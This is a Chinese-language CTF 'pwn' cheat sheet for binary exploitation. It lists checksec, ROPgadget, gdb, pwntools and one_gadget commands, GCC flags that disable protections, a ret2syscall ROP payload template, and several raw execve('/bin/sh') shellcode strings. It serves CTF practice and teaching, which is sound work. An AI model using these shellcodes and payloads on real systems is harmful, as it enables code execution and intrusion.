# PWN快查手册





## checksec

```bash
checksec pwn
```







## ldd查询动态链接库

查询链接库：

```
ldd pwn
```



但是这个只是一个软链接

```
file  刚刚查到的.so。6
```

就可以看到实际的`.so`了



## objdump

反汇编成汇编代码，查看是不是有特殊的gadget片段，尤其是`_libc_csu_init`

```bash
objdump -d pwn | less
```









查询plt表中的函数

```
objdump -d -j .plt pwn
```



## ROPgadget工具



read足够大的时候，可以直接一把梭

```
ROPgadget --binary pwn --ropchain
```



查找pwn程序中的rdi寄存器的地址

```bash
ROPgadget --binary ./pwn --only "pop|ret" | grep "rdi"
```

```bash
ROPgadget --binary ./pwn --only "ret"
```





查找库中的字符串，找pwn程序中的也可以

```bash
ROPgadget --binary pwn --string '/bin/sh'
```



```bash
ROPgadget --binary libc.so --string '/bin/sh'
```



## ret2syscall

such as下面的ret2syscall：64位就是syscall  32位就是int     0x80（五个空格）

```python
# 64位
payload = flat([pop_rax_ret , 0 , pop_rdi_ret , 0 , pop_rsi_ret , bin_sh_addr , pop_rdx_ret , 8 , syscall_addr])
payload += flat([pop_rax_ret , 0x3b , pop_rdi_ret , bin_sh_addr , pop_rsi_ret , 0 , pop_rdx_ret , 0 , syscall_addr])
r.send(b'/bin/sh\x00')
```



int 0x80要带ret，，32位就是read然后execve







## 本地缺少libc库

少库：

```
sudo apt-get install lib32stdc++6
```







## ==gdb调试==

要是想要双屏显示的话，第二个gdb要set,通过指令tty来查看，写在`~/.gdbinit`里面,这样子就可以一个显示一个操作了！！！

```
set context-output /dev/pts/0
```



```
gdb pwn

b main    # main函数下断点

info b # 查看当前断点

r    # 运行，就是运行整个程序，没有调试功能

start   # 运行到程序入口

i r   # 查看寄存器，但是要start才能用

c     # 让程序继续执行到下一个断点或者结束

ni     # 执行到当前函数的下一条指令

si   # 单步步入

fin     # 执行至当前函数结束  全称finish

vmmap     # 显示虚拟内存空间的分布

backtrace # 查询程序中所有的函数调用栈

tele 0x??????  # 查看这个内存中存储的内容

p &printf    # 查看printf函数的真实地址

p &__bss_start    # 查看bss段起始位置

p $rbp			# 打印指定寄存器的值
stack 40    # 查看栈上的空间

heap   # 查看堆信息

xinfo 地址    # 查看该地址信息，包括偏移

info variables    # 查看所有变量信息

hexdump 地址 大小    # 查看堆块分布  

kill # 断掉程序运行

shell vim flag.txt	# 在gdb里面直接运行vim

x/20b $rbp-0x10   # 看寄存器地址-0x10的20个bytes的值

x/20s $rbp      #  查看rbp寄存器的值及后面20位，但是以字符串形式显示

x/20i $rip   # 从rip寄存器开始编译汇编后面20行
x/20g $rbp      #  查看rbp寄存器的值及后面20位，但是8个字节显示
x/20b $rbp      #  查看rbp寄存器的值及后面20位，但是1个字节显示
x/20w $rbp      #  查看rbp寄存器的值及后面20位，但是4个字节显示
x/20x $rbp      #  查看rbp寄存器的值及后面20位，但是以十六进制显示
x/20d $rbp      #  查看rbp寄存器的值及后面20位，但是以十进制显示

set *地址=0x61    # 让这个地址的值等于0x61

q   # 退出gdb

```



堆

```
parseheap
查看使用的堆

heapinfo
查看堆的情况
```



```
disassemble main
反汇编

换成intel风格
set disassembly-flavor intel
```



## GCC出题关掉所有保护

```
NX：-z execstack / -z noexecstack (关闭 / 开启)    不让执行栈上的数据，于是JMP ESP就不能用了
Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)  栈里插入cookie信息
PIE：-no-pie / -pie (关闭 / 开启)   地址随机化，另外打开后会有get_pc_thunk
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)  对GOT表具有写权限

gcc -z execstack -fno-stack-protector -no-pie -z norelro
```



## pwntools本地调试

```
io=process("./pwn")
```



## ljust使用

左端不变，往右填充垃圾字节流

```python
asm(shellcraft.sh()).ljust(112,b'A')
```



## cyclic算真正的偏移量

gdb调试

```
cyclic 255
// 生成一个很长的字符串

r
// 运行程序

cyclic -l 一个无效地址
// 得到真正的偏移量
```



## fmtarg格式化字符串查偏移

printf打断点

输入数据

```
fmtarg 0x地址
```



## xxd

将二进制的文件以十六进制显示

```
xxd -gl pwn
```



将十六进制反向dump成二进制文件，甚至可以dump成可执行文件

```
xxd -gl pwn pwn.dump
xxd -r pwn.dump pwn.bye
chmod +x pwn.bye && ./pwn.bye
```









## ShellCode-asm&&shellcraft

shellcraft

内置了一系列的字节shellcode，并且能根据实际来进行匹配相应的shellcode

```python
from pwn import *    
[[pwntool生成shellcode]]
shellcode=asm(shellcraft.sh())
```







自己写的，较小的，



32位Linux的

```
shellcode_x86=b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```



64位Linux的24Byte的ShellCode：

```
shellcode_x64 ="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
```



64位Linux的23Byte的shellcode：

```
shellcode_x64 ="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
```



`execve("/bin/sh")` ，21字节的shellcode：

```
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
```



## ida跳转地址

反汇编窗口按下`G`





## flat

扁平化，免去经常写b'a' 、str( )、p32、p64的困扰，自动构建符合要求的payload。

```
payload = flat([pop_rax_ret , 0 , pop_rdi_ret , 0 , pop_rsi_ret , bin_sh_addr , pop_rdx_ret , 8 , syscall_addr])
```

想要添加'a'*60怎么办？

：

```
payload = flat(cyclic(60))
```

or

```
payload = flat([b'A'*112,pop_ret,0xb,pop_ret...])
```



## 找地址/bin/sh

```
hex(next(elf.search(b"/bin/sh")))
```



## ida取消dword

快捷键直接    `\`





## file

和checksec差不多，只不过更全，有hash值和ldd的功能

```bash
file pwn
```



## readelf

查看elf文件信息

```bash
readelf -A pwn | less
```



## gdb-vmmap

查看虚拟内存信息

```
vmm000ap
```



## strings

strings查看文件字符串，pwn中不常用，misc里面可能有非预期

```
strings pwn | less
```



## hexdump

查看十六进制，基本不用

```
hexdump pwn | less
```



## nm

查看函数表，基本不用

```bash
nm pwn
```



## 查看系统调用号

如果是断网ctf，那就直接查看自己电脑的系统调用号

```
less /usr/include/x86_64-linux-gnu/asm/unistd_64.h

less /usr/include/x86_64-linux-gnu/asm/unistd_32.h
```

因为这里无法全部查询到arm、x86、x64的



如果是网上，那就直接点链接：

https://syscall.sh/



## 端口部署pwn

如果想要你的pwn程序作为试题部署在你的服务器某个端口你可以：

```
socat tcp-1:8888,fork exec:./pwn,reuseaddr
```



## one_gadget

查找攻击项：

给的是偏移地址！！

```
one_gadget xxxxx.so

```



## SSH链接

```python
from pwn import *

session = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0')

r = session.process('sh', env={"PS1":""})
r.sendline('echo Hello, world!')
r.recvline()
```





## LibcSearcher查询不到

```
sudo pip3 install -U LibcSearcher
```



```
from LibcSearcher import *
obj = LibcSearcher("fgets", 0x7ff39014bd90) # 使用一个已知符号地址作为初始约束，初始化 LibcSearcher
obj.add_condition("atoi", 218528) # 添加一个约束条件
obj.dump("printf") # 根据已有约束条件，查询某个符号在 Libc 中的地址
```

